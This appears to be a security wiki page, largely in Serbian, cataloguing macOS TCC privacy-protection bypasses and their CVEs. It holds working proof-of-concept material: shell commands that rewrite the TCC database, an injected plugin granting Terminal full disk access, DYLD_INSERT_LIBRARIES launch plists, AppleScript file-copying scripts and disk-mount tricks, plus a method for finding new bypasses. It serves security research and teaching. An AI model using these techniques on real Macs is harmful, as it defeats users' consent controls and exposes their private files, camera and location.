# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## Prema funkcionalnosti

### Write Bypass

Ovo nije bypass, već samo način na koji TCC funkcioniše: **Ne štiti od upisivanja**. Ako Terminal **nema pristup čitanju Desktop direktorijuma korisnika, i dalje može da upisuje u njega**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
Prošireni atribut **`com.apple.macl`** dodaje se novom **fajlu** kako bi **creators app** dobio pristup za njegovo čitanje.

### TCC ClickJacking

Moguće je **postaviti prozor preko TCC prompta** kako bi korisnik **prihvatio** zahtev, a da to ne primeti. PoC možete pronaći u [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Attacker može da **kreira aplikacije sa proizvoljnim imenom** (npr. Finder, Google Chrome...) u **`Info.plist`** fajlu i da zahteva pristup nekoj lokaciji zaštićenoj pomoću TCC-a. Korisnik će misliti da je legitimna aplikacija ta koja zahteva ovaj pristup.\
Pored toga, moguće je **ukloniti legitimnu aplikaciju iz Dock-a i postaviti lažnu aplikaciju na njeno mesto**, pa kada korisnik klikne na lažnu aplikaciju (koja može koristiti istu ikonu), ona može pozvati legitimnu aplikaciju, zatražiti TCC permissions i izvršiti malware, navodeći korisnika da poveruje da je legitimna aplikacija zahtevala pristup.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Više informacija i PoC:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Podrazumevano je pristup preko **SSH-a imao "Full Disk Access"**. Da biste ga onemogućili, potrebno je da bude naveden, ali onemogućen (uklanjanje sa liste neće ukloniti te privilegije):<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: Podrazumevano je pristup preko SSH-a imao "Full Disk Access". Da biste ga onemogućili, potrebno je da bude naveden, ali onemogućen (uklanjanje sa liste neće ukloniti te...](<../../../../../images/image (1077).png>)

Ovde možete pronaći primere kako su neki **malware-i uspeli da zaobiđu ovu zaštitu**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[11]](#references)</sup>

> [!CAUTION]
> Imajte na umu da je sada, da biste mogli da omogućite SSH, potreban **Full Disk Access**

### Handle extensions - CVE-2022-26767

Atribut **`com.apple.macl`** dodeljuje se fajlovima kako bi **određenoj aplikaciji dao dozvole za njihovo čitanje.** Ovaj atribut se postavlja kada se fajl **prevuče i otpusti** preko aplikacije ili kada korisnik **dvaput klikne** na fajl kako bi ga otvorio pomoću **podrazumevane aplikacije**.

Zbog toga bi korisnik mogao da **registruje malicious app** za obradu svih ekstenzija i pozove Launch Services da **otvori** bilo koji fajl (čime će malicious file dobiti pristup za čitanje).

### iCloud

Entitlement **`com.apple.private.icloud-account-access`** omogućava komunikaciju sa **`com.apple.iCloudHelper`** XPC service-om, koji će **obezbediti iCloud tokene**.

**iMovie** i **Garageband** imali su ovaj entitlement i druge koji su to omogućavali.

Za više **informacija** o exploitu za **dobijanje iCloud tokena** pomoću ovog entitlement-a pogledajte predavanje: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[12]](#references)</sup>

### kTCCServiceAppleEvents / Automation

Aplikacija sa **`kTCCServiceAppleEvents`** permission-om moći će da **kontroliše druge aplikacije**. To znači da bi mogla da **zloupotrebi permissions dodeljene drugim aplikacijama**.

Za više informacija o Apple Scripts pogledajte:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Na primer, ako aplikacija ima **Automation permission nad `iTerm`-om**, u ovom primeru **`Terminal`** ima pristup iTerm-u:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal, koji nema FDA, može da pozove iTerm, koji ga ima, i da ga iskoristi za izvršavanje radnji:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Preko Finder-a

Ili, ako App ima pristup preko Finder-a, može da pokrene skriptu kao što je ova:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Ponašanje po aplikaciji

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

userland **tccd daemon** je koristio **`HOME`** **env** promenljivu za pristup TCC bazi podataka korisnika na lokaciji: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Prema [ovoj Stack Exchange objavi](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), pošto se TCC daemon pokreće putem **`launchd`** unutar domena trenutnog korisnika, moguće je **kontrolisati sve env promenljive** koje mu se prosleđuju.\
Na taj način, **attacker može da postavi `$HOME` env** promenljivu u **`launchctl`** tako da pokazuje na **kontrolisani** **direktorijum**, da restartuje **TCC** daemon, a zatim direktno izmeni **TCC bazu podataka** kako bi sebi dodelio **svaki dostupan TCC entitlement**, bez ikakvog upita krajnjem korisniku.<sup>[[1]](#references)</sup>\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Napomene

Notes je imao pristup lokacijama zaštićenim pomoću TCC-a, ali kada se napomena kreira, ona se **kreira na nezaštićenoj lokaciji**. Zato je bilo moguće zatražiti od aplikacije Notes da kopira zaštićeni fajl u napomenu (odnosno na nezaštićenu lokaciju), a zatim pristupiti tom fajlu:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Binarni fajl `/usr/libexec/lsd` sa bibliotekom `libsecurity_translocate` imao je entitlement `com.apple.private.nullfs_allow`, koji mu je omogućavao da kreira **nullfs** mount, kao i entitlement `com.apple.private.tcc.allow` sa **`kTCCServiceSystemPolicyAllFiles`**, koji mu je omogućavao pristup svakom fajlu.

Bilo je moguće dodati quarantine atribut direktorijumu "Library", pozvati **`com.apple.security.translocation`** XPC servis, nakon čega bi on mapirao Library na **`$TMPDIR/AppTranslocation/d/d/Library`**, gde je bilo moguće **pristupiti** svim dokumentima unutar Library-ja.

### CVE-2024-44131 - FileProvider symlink race

Aplikacije koje prosleđuju operacije nad fajlovima **privileged helper** procesu (ovde **`fileproviderd`** / **`Files.app`**) kopiraju ili premeštaju stavke **u ime korisnika**, pa se kopiranje izvršava sa privilegijama helper-a umesto sa privilegijama pozivaoca.

Jamf Threat Labs je pokazao da se validacija symlink-a, koja se obavlja pre operacije, može **race-ovati**: umesto postavljanja symlink-a na **poslednju** komponentu putanje (koja se proverava), attacker menja **međudirektorijum** putanje **nakon što je kopiranje već započelo**. Privileged helper zatim prati link kojim upravlja attacker i čita/upisuje lokacije zaštićene pomoću TCC-a **bez ikakvog prikazivanja prompt-a**.<sup>[[7]](#references)</sup>

Direktorijumi koji **nisu** zaštićeni nasumičnim UUID-om u svojoj putanji (na primer `~/Library/Mobile Documents/com~apple~CloudDocs`) najlakše su mete, jer attacker može da predvidi punu putanju za race.

> [!TIP]
> Ovo je generički pattern koji treba tražiti: **svaki privileged proces koji putanju razrešava više puta** (check-then-use ili situacija u kojoj `rename()`/`copyfile()` zasebno razrešavaju source i destination) može biti napadnut race-om zamenom direktorijuma u sredini putanje. Samo `O_NOFOLLOW_ANY`, `openat()` nad već otvorenim directory FD-om ili `realpath()` + ponovna validacija zaista zatvaraju ovaj vremenski prozor.

Više informacija nalazi se u [**Jamf Threat Labs writeup-u**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[7]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` može biti build-ovan sa `SQLITE_ENABLE_SQLLOG`, što dodaje logging hook kojim upravljaju environment variables ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[8]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – za **svaku bazu podataka koja se otvori**, **kopija fajla baze podataka** i log SQL naredbi upisuju se u `path` (direktorijum mora već da postoji).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – kreira **novu kopiju svaki put** kada se DB otvori/attach-uje, umesto ponovnog korišćenja postojeće.
- **`SQLITE_SQLLOG_CONDITIONAL`** – loguje konekciju samo ako pored glavne DB postoji fajl `<database>-sqllog`.

Ako možeš da inject-uješ ovu promenljivu u proces koji ima **FDA** i otvara SQLite baze podataka, on će bez problema **kopirati te zaštićene baze podataka** u direktorijum kojim upravljaš. Pošto se ime odredišnog fajla izvodi iz podataka kojima upravlja attacker, **symlink postavljen na destination-u** pretvara isti primitive u **arbitrary file write** sa privilegijama ciljnog procesa.

### **SQLITE_AUTO_TRACE**

Ako je environment variable **`SQLITE_AUTO_TRACE`** postavljen, biblioteka **`libsqlite3.dylib`** počeće da **loguje** sve SQL upite. Mnoge aplikacije koristile su ovu biblioteku, pa je bilo moguće logovati sve njihove SQLite upite.

Nekoliko Apple aplikacija koristilo je ovu biblioteku za pristup informacijama zaštićenim pomoću TCC-a.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Hunting for env-var driven file writes

Dva prethodna unosa su primeri iste generičke tehnike i vredi tragati za još njih: **frameworks učitani u TCC-privileged apps često izlažu debug/logging environment variables koje dovode do toga da process kreira file na putanji pod kontrolom pozivaoca**.

Workflow za njihovo pronalaženje:

1. Izaberite target sa FDA ili drugom korisnom TCC dozvolom (`Music`, `TV`, `Terminal`, MDM agents...) i izlistajte frameworks koje povezuje (`otool -L`, `vmmap`).
2. Pretražite te frameworks za `getenv` strings: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Postavite candidate variables pomoću `launchctl setenv NAME /path/you/control`, pokrenite app i pratite šta radi u filesystem-u pomoću `fs_usage -w -f filesys <pid>` ili `sudo fs_usage | grep <path>`.
4. Ako process **kreira ili preimenuje** file u vašem directory-ju, imate write primitive: usmerite destination na symlink (ili izvedite race nad intermediate directory-jem, kao kod CVE-2024-44131 iznad) da biste ga preusmerili na `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Dve stvari ovo ograničavaju. Prvo, **`DYLD_*` variables se ignorišu za hardened-runtime binaries** osim ako app ne isporučuje entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) ("a Boolean value that indicates whether the app may be affected by dynamic linker environment variables, which you can use to inject code into your app's process") — pogledajte i [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Drugo, Apple uklanja pojedinačne framework debug variables kada budu prijavljene, pa variable koja je radila na jednom macOS izdanju često nestane u sledećem. Ako app nečujno odbije da se pokrene nakon što je postavite, tretirajte tu variable kao već filtriranu.

Pogledajte [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) za ekvivalentan trik sa linker variables.

### Apple Remote Desktop

Kao root mogli biste da omogućite ovaj service, a **ARD agent bi imao full disk access**, što bi user zatim mogao da zloupotrebi kako bi kopirao novu **TCC user bazu**.

## Preko **NFSHomeDirectory**

TCC koristi bazu u HOME folderu user-a za kontrolu pristupa resources specifičnim za user-a na **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Zato, ako user uspe da restartuje TCC sa $HOME env variable koja pokazuje na **drugi folder**, mogao bi da kreira novu TCC bazu u **/Library/Application Support/com.apple.TCC/TCC.db** i prevari TCC da dodeli bilo koju TCC dozvolu bilo kojoj app.

> [!TIP]
> Imajte na umu da Apple koristi podešavanje sačuvano u profilu user-a, u atributu **`NFSHomeDirectory`**, kao **vrednost za `$HOME`**, pa ako kompromitujete application sa dozvolama za izmenu ove vrednosti (**`kTCCServiceSystemPolicySysAdminFiles`**), ovu opciju možete **weaponize** pomoću TCC bypass-a.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**Prvi POC** koristi [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) i [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) za izmenu **HOME** foldera user-a.

1. Nabavite _csreq_ blob za target app.
2. Postavite lažni _TCC.db_ file sa potrebnim pristupom i _csreq_ blob-om.
3. Export-ujte Directory Services unos user-a pomoću [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Izmenite Directory Services unos da biste promenili home directory user-a.
5. Import-ujte izmenjeni Directory Services unos pomoću [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Zaustavite _tccd_ user-a i reboot-ujte process.

Drugi POC je koristio **`/usr/libexec/configd`**, koji je imao `com.apple.private.tcc.allow` sa vrednošću `kTCCServiceSystemPolicySysAdminFiles`.\
Bilo je moguće pokrenuti **`configd`** sa opcijom **`-t`**, pri čemu je attacker mogao da navede **custom Bundle za učitavanje**. Zato exploit **zamenjuje** metod promene home directory-ja user-a pomoću **`dsexport`** i **`dsimport`** sa **`configd` code injection-om**.

Za više informacija pogledajte [**originalni report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[[13]](#references)</sup>

## Preko process injection-a

Postoje različite tehnike za inject-ovanje koda unutar process-a i zloupotrebu njegovih TCC privileges:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Štaviše, najčešći process injection za bypass TCC-a je putem **plugins-a (load library)**.\
Plugins su dodatni kod, obično u obliku libraries ili plist-a, koji će biti **učitani od strane glavne application** i izvršavaće se u njenom context-u. Zato, ako je glavna application imala pristup TCC restricted files (putem dodeljenih permissions ili entitlements), **custom code će ga takođe imati**.

### CVE-2020-27937 - Directory Utility

Application `/System/Library/CoreServices/Applications/Directory Utility.app` imala je entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, učitavala plugins sa ekstenzijom **`.daplug`** i **nije imala hardened** runtime.

Da bi se ovaj CVE weaponize-ovao, **`NFSHomeDirectory`** se **menja** (zloupotrebom prethodnog entitlement-a) kako bi bilo moguće **preuzeti TCC bazu user-a** i zaobići TCC.

Za više informacija pogledajte [**originalni report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[[14]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

Binary **`/usr/sbin/coreaudiod`** imao je entitlements `com.apple.security.cs.disable-library-validation` i `com.apple.private.tcc.manager`. Prvi je **omogućavao code injection**, a drugi mu je davao pristup za **upravljanje TCC-om**.

Ovaj binary je omogućavao učitavanje **third party plug-ins** iz foldera `/Library/Audio/Plug-Ins/HAL`. Zato je bilo moguće **učitati plugin i zloupotrebiti TCC permissions** pomoću ovog POC-a:<sup>[[15]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Za više informacija pogledajte [**originalni izveštaj**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[15]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

System aplikacije koje otvaraju stream kamere putem Core Media I/O (aplikacije sa **`kTCCServiceCamera`**) učitavaju ove plug-inove unutar procesa, koji se nalaze u direktorijumu `/Library/CoreMediaIO/Plug-Ins/DAL` (nije ograničen SIP-om).

Dovoljno je u taj direktorijum smestiti biblioteku sa uobičajenim **constructor**-om da bi se izvršio **inject code**.

Nekoliko Apple aplikacija bilo je ranjivo na ovo.

### Firefox

Firefox aplikacija je imala entitlements `com.apple.security.cs.disable-library-validation` i `com.apple.security.cs.allow-dyld-environment-variables`:<sup>[[16]](#references)</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Za više informacija o tome kako ovo lako exploitovati, [**pogledajte originalni izveštaj**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[16]](#references)</sup>

### CVE-2020-10006

Binarni fajl `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` imao je entitlements **`com.apple.private.tcc.allow`** i **`com.apple.security.get-task-allow`**, što je omogućavalo ubacivanje koda u proces i korišćenje TCC privilegija.

### CVE-2023-26818 - Telegram

Telegram je imao entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** i **`com.apple.security.cs.disable-library-validation`**, pa je bilo moguće abuse-ovati ga za **dobijanje pristupa njegovim dozvolama**, kao što je snimanje kamerom. [**Payload možete pronaći u writeup-u**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[17]](#references)</sup>

Obratite pažnju na to kako je korišćena env promenljiva za učitavanje biblioteke: napravljen je **prilagođeni plist** za ubacivanje te biblioteke, a zatim je korišćen **`launchctl`** za njeno pokretanje:<sup>[[17]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Putem `open` poziva

Moguće je pozvati **`open`** čak i kada ste u sandbox-u

### Terminal Scripts

Prilično je uobičajeno dodeliti terminalu **Full Disk Access (FDA)**, barem na računarima koje koriste tehnički stručnjaci. Takođe je moguće pomoću njega pozivati **`.terminal`** skripte.

**`.terminal`** skripte su plist datoteke poput ove, sa komandom za izvršavanje u ključu **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Aplikacija bi mogla da upiše terminal skriptu na lokaciju kao što je /tmp i da je pokrene komandom kao što je:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Montiranjem

### CVE-2020-9771 - mount_apfs TCC bypass i eskalacija privilegija

**Bilo koji korisnik** (čak i neprivilegovani) može da kreira i montira Time Machine snapshot i da pristupi **SVIM datotekama** tog snapshot-a.\
**Jedina potrebna privilegija** jeste da aplikacija koja se koristi (kao što je `Terminal`) ima **Full Disk Access** (FDA) pristup (`kTCCServiceSystemPolicyAllfiles`), koji mora da odobri administrator.<sup>[[2]](#references)</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Detaljnije objašnjenje možete [**pronaći u originalnom izveštaju**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file

Čak i ako je TCC DB file zaštićen, bilo je moguće **mount-ovati preko direktorijuma** novi TCC.db file:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Proverite **full exploit** u [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Kao što je objašnjeno u [original writeup](https://www.kandji.io/blog/macos-audit-story-part2), ovaj CVE je zloupotrebljavao `diskarbitrationd`.<sup>[[18]](#references)</sup>

Funkcija `DADiskMountWithArgumentsCommon` iz javnog `DiskArbitration` framework-a obavljala je bezbednosne provere. Međutim, moguće je zaobići je direktnim pozivanjem `diskarbitrationd` i time koristiti `../` elemente u path-u i symlinks.

To je napadaču omogućilo da izvrši proizvoljne mount-ove na bilo kojoj lokaciji, uključujući i preko TCC baze podataka, zbog entitlement-a `com.apple.private.security.storage-exempt.heritable` procesa `diskarbitrationd`.

### asr

Alat **`/usr/sbin/asr`** omogućavao je kopiranje celog diska i njegovo mount-ovanje na drugoj lokaciji, uz zaobilaženje TCC zaštita.

### CVE-2022-22655 - Location Services

Location Services se **ne čuvaju** u TCC bazi podataka kao ostali servisi. Njima upravlja `locationd`, koji održava sopstveni allow-list u **`/var/db/locationd/clients.plist`**:<sup>[[5]](#references)</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
Svaki unos je označen klijentom (bundle ID ili putanja do izvršne datoteke) i sadrži polja kao što su `Authorized`, `BundleId`, `Executable` i `Registered`.

Sama datoteka `clients.plist` zaštićena je mehanizmima Sandbox/TCC i ne može se uređivati čak ni kao root — ali **direktorijum `/var/db/locationd/` nije bio zaštićen od mountovanja**. Zato je attacker koji radi kao root mogao da napravi disk image koji sadrži njegovu verziju datoteke `clients.plist` (sa svojim binaryjem označenim kao `Authorized`), mountuje ga preko tog direktorijuma i restartuje `locationd`, čime bi falsifikovana allow-lista stupila na snagu.<sup>[[5]](#references)</sup>

> [!TIP]
> Ovo je isti obrazac kao kod `hdiutil`/`mount` TCC bypass-a iznad: *datoteka* je zaštićena, ali *direktorijum u kojem se nalazi* nije, pa se umesto datoteke zamenjuje ceo direktorijum.

## Preko startup aplikacija


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Preko grep-a

U više slučajeva datoteke će čuvati osetljive informacije, kao što su email adrese, brojevi telefona, poruke... na nezaštićenim lokacijama (što se kod Apple-a smatra ranjivošću).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Ovo više ne funkcioniše, ali [**ranije je funkcionisalo**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Drugi način pomoću [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[[19]](#references)</sup>

<figure><img src="../../../../../images/image (30).png alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: Bypassing the macOS Transparency, Consent, and Control (TCC) Framework](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Bypassing macOS TCC User Privacy Protections By Accident and Design](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [20+ Ways to Bypass Your macOS Privacy Mechanisms](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [4] [Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [5] [CVE-2022-22655 - TCC Location Services bypass (original report)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [6] [Where in the World is Carmen Sandiego: Abusing Location Services on macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [7] [Jamf Threat Labs - CVE-2024-44131: TCC bypass steals data from iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [8] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [9] [Apple - Allow DYLD environment variables entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [10] [The Eclectic Light Company - Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [11] [Zero-Day TCC bypass discovered in XCSSET malware](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [12] [OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [13] [New macOS vulnerability, "powerdir," could lead to unauthorized user data access](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [14] [Change home directory and bypass TCC aka CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [15] [Play the music and bypass TCC aka CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [16] [How to rob a (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [17] [CVE-2023-26818 - Bypassing TCC with Telegram in macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
